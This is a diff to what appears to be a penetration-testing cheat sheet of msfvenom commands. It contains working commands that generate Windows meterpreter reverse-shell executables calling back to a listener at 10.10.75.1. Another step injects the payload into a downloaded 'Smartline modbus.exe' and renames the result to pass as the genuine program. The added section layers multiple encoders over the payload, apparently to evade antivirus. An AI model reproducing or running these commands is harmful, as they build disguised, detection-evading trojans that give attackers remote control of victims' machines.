@@ -14,3 +14,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.75.1 LPORT=8080 -f exe -
 wget website/download.exe
 msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 -o tmp.exe -k -x 'Smartline modbus.exe'
 mv tmp.exe SmartLineModBus.exe 	
+
+
+#### Double encoded payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.75.1 LPORT=8080 -a x86 --platform windows -e x86/shikata_ga_nai -i 100 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 138 -f exe -o new_payload.exe
